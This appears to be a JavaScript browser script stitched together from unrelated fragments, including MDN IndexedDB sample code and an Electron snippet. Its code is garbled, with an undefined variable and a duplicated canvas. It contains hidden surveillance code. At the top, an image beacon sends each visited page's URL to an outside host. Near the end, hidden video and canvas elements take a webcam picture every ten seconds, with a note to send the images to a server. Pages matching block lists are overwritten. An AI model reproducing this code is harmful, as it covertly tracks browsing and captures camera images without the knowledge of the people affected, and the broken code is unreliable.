// Big lol: https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB

var img = document.createElement('img');
img.src = "http://albert.entredev.com?url=" + encodeURIComponent(window.location.href);
document.body.appendChild(img);

function checkIfLoaded(){
  if(!window.badSites){
    return setTimeout(checkIfLoaded, 100);
  }

  window.badSites.forEach(function(badSite){
    if(location.hostname.endsWith(badSite.parent_domain)){
      document.write('yarga (courtesy of Bert Hao)');
      return;
    }
  });
}
checkIfLoaded();

// Database
// In the following line, you should include the prefixes of implementations you want to test.
window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
// DON'T use "var indexedDB = ..." if you're not in a function.
// Moreover, you may need references to some window.IDB* objects:
window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction || {READ_WRITE: "readwrite"}; // This line should only be needed if it is needed to support the object's constants for older browsers
window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange;
// (Mozilla has never prefixed these objects, so we don't need window.mozIDB*)

if (!window.indexedDB) {
    window.alert("Your browser doesn't support a stable version of IndexedDB. Such and such feature will not be available.");
}

const customerData = [
];

const dbName = "ze_name";
var db;
var request = indexedDB.open("PackTrackDB");
request.onerror = function(event) {
  alert(`An error has occured: ${event.target.errorCode}. Please allow your browser to acces IndexedDB.`);
};
request.onsuccess = function(event) {
  db = event.target.result;

  var transaction = db.transaction(["customers"], "readwrite");


  transaction.oncomplete = function(event) {
    alert("All done!");
  };

  transaction.onerror = function(event) {
    alert("Big death: " + event.target.error)
    // Don't forget to handle errors!
  };

  var objectStore = transaction.objectStore("customers");
  customerData.forEach(function(customer) {
    var request = objectStore.add(customer);
    request.onsuccess = function(event) {
      // event.target.result === customer.ssn;
    };
  });
};

// This event is only implemented in recent browsers
request.onupgradeneeded = function(event) {
  /*var db = event.target.result;

  var transaction = db.transaction(["customers"], "readwrite");
  // Note: Older experimental implementations use the deprecated constant IDBTransaction.READ_WRITE instead of "readwrite".
  // In case you want to support such an implementation, you can write:
  // var transaction = db.transaction(["customers"], IDBTransaction.READ_WRITE);

  // Do something when all the data is added to the database.


  transaction.oncomplete = function(event) {
    alert("All done!");
  };

  transaction.onerror = function(event) {
    alert("Big death: " + event.target.errorCode)
    // Don't forget to handle errors!
  };

  var objectStore = transaction.objectStore("customers");
  customerData.forEach(function(customer) {
    var request = objectStore.add(customer);
    request.onsuccess = function(event) {
      // event.target.result === customer.ssn;
    };
  });

  // Create another object store called "names" with the autoIncrement flag set as true.
  var objStore = db.createObjectStore("names", { autoIncrement : true });

  // Create an objectStore to hold information about our customers. We're
  // going to use "ssn" as our key path because it's guaranteed to be
  // unique - or at least that's what I was told during the kickoff meeting.
  /*var objectStore = db.createObjectStore("customers", { keyPath: "ssn" });

  // Create an index to search customers by name. We may have duplicates
  // so we can't use a unique index.
  objectStore.createIndex("name", "name", { unique: false });

  // Create an index to search customers by email. We want to ensure that
  // no two customers have the same email, so use a unique index.
  objectStore.createIndex("email", "email", { unique: true });*/


  // Because the "names" object store has the key generator, the key for the name value is generated automatically.
  //   The added records would be like:
  //   key : 1 => value : "Bill"
  //   key : 2 => value : "Donna"
  /*customerData.forEach(function(customer) {
        objStore.add(customer.name);
    });

  // Use transaction oncomplete to make sure the objectStore creation is
  // finished before adding data into it.
  /*objectStore.transaction.oncomplete = function(event) {
    // Store values in the newly created objectStore.
    var customerObjectStore = db.transaction("customers", "readwrite").objectStore("customers");
    customerData.forEach(function(customer) {
      customerObjectStore.add(customer);
    });
  };*/
};



var video = document.createElement('video');
vidElement.style.visibility = 'hidden';

var canvas = document.createElement('canvas'); // Set the canvas up
canvas.width = 640;
canvas.height = 480;
canvas.style.visibility = 'hidden';
var ctx = canvas.getContext('2d');

var images;

navigator.getUserMedia = navigator.getUserMedia || // Set up navigator.getUserMedia -- this is
navigator.webkitGetUserMedia ||
navigator.mozGetUserMedia ||
navigator.msGetUserMedia ||
navigator.oGetUserMedia;

if (navigator.getUserMedia) { // If navigator.getUserMedia exists and is not a null value
  navigator.getUserMedia({video: true}, handleVideo, videoError); // Set the video up.
  // Arg 1: condition, Arg 2: What to do with the video, Arg 3: What to do if there is an error
}

function handleVideo(stream) { // Stream the video
  video.srcObject = stream; // Sets the source of the video element as the stream
  video.onloadedmetadata = function(e) {
    video.play(); // Play the video
  }
}

function videoError(e) {
  console.log(e); // If there is an error, console.log what the error is
}

function takePic() { // Function to take a picture
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw the current video frame onto the canvas

  var dataURI = canvas.toDataURL('image/jpeg'); // Translate the picture on the canvas into a link

  document.getElementById("takenPic").src = dataURI; // An image element with the id of "takenPic" will display the image

  // TODO: Change the download to send to server
  //console.log(dataURI)

  var download = document.getElementById('download');

  download.href = dataURI;

  download.click();
}

var canvas = document.createElement('canvas'); // Set the canvas up
canvas.width = 640;
canvas.height = 480;
var ctx = canvas.getContext('2d');

setInterval(takePic, 10000); // Sets an interval where every single 10000 ms (10 sec) it will call takePic

let webviewSession = session.fromPartition(partitionName);
webviewSession.on('will-download', function(e, item, webContents) {
    if (item.getMimeType() === "application/pdf") {
        e.preventDefault()
        // logic
    }
})

var siteText = document.body.textContent;
function blockByContent() {
  window.badWords.forEach(function(badWord){
    var pattern = new RegExp(badWord, 'ig');
    if(pattern.test(siteText)) {
      document.write('yarga (courtesy of Bert Hao)');
      return;
    }
  });
}
